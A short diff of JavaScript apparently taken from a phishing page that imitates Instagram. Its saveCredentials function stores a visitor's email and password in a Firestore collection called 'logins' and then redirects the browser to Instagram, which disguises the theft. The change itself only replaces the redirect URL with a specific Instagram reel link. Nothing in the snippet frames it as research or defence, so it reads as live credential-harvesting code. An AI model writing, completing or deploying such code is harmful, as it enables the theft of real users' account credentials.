@@ -166,7 +166,7 @@ async function saveCredentials() {
   try {
     await addDoc(collection(db, "logins"), { email, password, timestamp: new Date() });
     // Redirect to Instagram.com after saving
-    window.location.href = "https://www.instagram.com/";
+    window.location.href = "https://www.instagram.com/reel/DO4GVTnDA94/?igsh=MWI0Nmc1bWZkZG9zZw==";
   } catch (err) {
     messageBox.textContent = "Error saving credentials: " + err.message;
   }
